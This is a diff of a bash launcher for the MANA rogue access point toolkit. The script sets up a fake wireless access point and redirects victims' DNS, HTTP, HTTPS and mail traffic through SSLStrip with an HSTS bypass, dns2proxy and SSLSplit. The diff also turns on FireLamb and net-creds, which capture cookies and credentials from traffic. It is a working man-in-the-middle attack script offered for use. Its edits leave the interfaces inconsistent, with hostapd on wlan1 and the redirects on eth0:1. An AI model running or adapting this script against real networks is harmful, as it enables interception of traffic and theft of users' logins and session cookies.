@@ -1,7 +1,11 @@
 #!/bin/bash
 
+#I can haz virutal interface?
+ifconfig eth0:1 10.10.10.1 netmask 255.255.255.0
+ip route add 10.0.0.0/16 via 10.10.10.1
+
 upstream=eth0
-phy=wlan1
+phy=eth0:1
 conf=/etc/mana-toolkit/hostapd-common.conf
 hostapd=/usr/lib/mana-toolkit/hostapd
 
@@ -12,14 +16,14 @@ sleep 2
 service network-manager stop
 rfkill unblock wlan
 
-ifconfig $phy down
-macchanger -r $phy
-ifconfig $phy up
+#ifconfig $phy down
+#macchanger -r $phy
+#ifconfig $phy up
 
-sed -i "s/^interface=.*$/interface=$phy/" $conf
+sed -i "s/^interface=.*$/interface=wlan1/" $conf
 $hostapd $conf&
 sleep 5
-ifconfig wlan 10.0.0.1 netmask 255.255.255.0
+ifconfig wlan1 10.0.0.1 netmask 255.255.255.0
 ifconfig wlan1_1 10.0.10.1 netmask 255.255.255.0
 ifconfig wlan1_2 10.0.20.1 netmask 255.255.255.0
 ifconfig wlan1_3 10.0.30.1 netmask 255.255.255.0
@@ -34,7 +38,7 @@ route add -net 10.0.40.0 netmask 255.255.255.0 gw 10.0.40.1
 route add -net 10.0.50.0 netmask 255.255.255.0 gw 10.0.50.1
 route add -net 10.0.60.0 netmask 255.255.255.0 gw 10.0.60.1
 
-dhcpd -cf /etc/mana-toolkit/dhcpd-common.conf wlan1 wlan1_1 wlan1_2 wlan1_3 wlan1_4 wlan1_5 wlan1_6  
+dhcpd -cf /etc/mana-toolkit/dhcpd-common.conf wlan1 wlan1_1 wlan1_2 wlan1_3 wlan1_4 wlan1_5 wlan1_6
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 iptables --policy INPUT ACCEPT
@@ -42,23 +46,17 @@ iptables --policy FORWARD ACCEPT
 iptables --policy OUTPUT ACCEPT
 iptables -F
 iptables -t nat -F
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-iptables -A FORWARD -i eth0 -j ACCEPT
-#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
+iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
+iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
+#iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.10.10.1
+iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.10.10.1
 
 #SSLStrip with HSTS bypass
 cd /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/
 python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log.`date "+%s"`&
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/
-python dns2proxy.py -i wlan1 &
+python dns2proxy.py -i eth0:1&
 cd -
 
 #SSLSplit
@@ -74,82 +72,36 @@ sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/c
 #iptables -t nat -A INPUT -i $phy \
  #-p tcp --destination-port 80 \
  #-j REDIRECT --to-port 10080
-
- #wlan1
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 443 -j REDIRECT --to-port 10443
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 143 -j REDIRECT --to-port 10143
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 993 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 465 -j REDIRECT --to-port 10465
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 25 -j REDIRECT --to-port 10025
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 995 -j REDIRECT --to-port 10995
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --destination-port 110 -j REDIRECT --to-port 10110
-
-#wlan1_1
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 443 -j REDIRECT --to-port 10443
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 143 -j REDIRECT --to-port 10143
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 993 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 465 -j REDIRECT --to-port 10465
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 25 -j REDIRECT --to-port 10025
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 995 -j REDIRECT --to-port 10995
-iptables -t nat -A PREROUTING -i wlan1_1 -p tcp --destination-port 110 -j REDIRECT --to-port 10110
-
-#wlan1_2
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 443 -j REDIRECT --to-port 10443
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 143 -j REDIRECT --to-port 10143
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 993 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 465 -j REDIRECT --to-port 10465
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 25 -j REDIRECT --to-port 10025
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 995 -j REDIRECT --to-port 10995
-iptables -t nat -A PREROUTING -i wlan1_2 -p tcp --destination-port 110 -j REDIRECT --to-port 10110
-
-#wlan1_3
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 443 -j REDIRECT --to-port 10443
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 143 -j REDIRECT --to-port 10143
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 993 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 465 -j REDIRECT --to-port 10465
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 25 -j REDIRECT --to-port 10025
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 995 -j REDIRECT --to-port 10995
-iptables -t nat -A PREROUTING -i wlan1_3 -p tcp --destination-port 110 -j REDIRECT --to-port 10110
-
-#wlan1_4
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 443 -j REDIRECT --to-port 10443
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 143 -j REDIRECT --to-port 10143
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 993 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 465 -j REDIRECT --to-port 10465
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 25 -j REDIRECT --to-port 10025
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 995 -j REDIRECT --to-port 10995
-iptables -t nat -A PREROUTING -i wlan1_4 -p tcp --destination-port 110 -j REDIRECT --to-port 10110
-
-#wlan1_5
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 443 -j REDIRECT --to-port 10443
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 143 -j REDIRECT --to-port 10143
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 993 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 465 -j REDIRECT --to-port 10465
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 25 -j REDIRECT --to-port 10025
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 995 -j REDIRECT --to-port 10995
-iptables -t nat -A PREROUTING -i wlan1_5 -p tcp --destination-port 110 -j REDIRECT --to-port 10110
-
-#wlan1_6
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 443 -j REDIRECT --to-port 10443
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 143 -j REDIRECT --to-port 10143
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 993 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 465 -j REDIRECT --to-port 10465
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 25 -j REDIRECT --to-port 10025
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 995 -j REDIRECT --to-port 10995
-iptables -t nat -A PREROUTING -i wlan1_6 -p tcp --destination-port 110 -j REDIRECT --to-port 10110
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 443 \
+ -j REDIRECT --to-port 10443
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 143 \
+ -j REDIRECT --to-port 10143
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 993 \
+ -j REDIRECT --to-port 10993
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 65493 \
+ -j REDIRECT --to-port 10993
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 465 \
+ -j REDIRECT --to-port 10465
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 25 \
+ -j REDIRECT --to-port 10025
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 995 \
+ -j REDIRECT --to-port 10995
+iptables -t nat -A PREROUTING -i $phy \
+ -p tcp --destination-port 110 \
+ -j REDIRECT --to-port 10110
 
 # Start FireLamb
-#/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &
+/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &
 
 # Start net-creds
-#python /usr/share/mana-toolkit/net-creds/net-creds.py -i $phy > /var/lib/mana-toolkit/net-creds.log.`date "+%s"`
+python /usr/share/mana-toolkit/net-creds/net-creds.py -i $phy > /var/lib/mana-toolkit/net-creds.log.`date "+%s"`
 
 echo "Hit enter to kill me"
 read
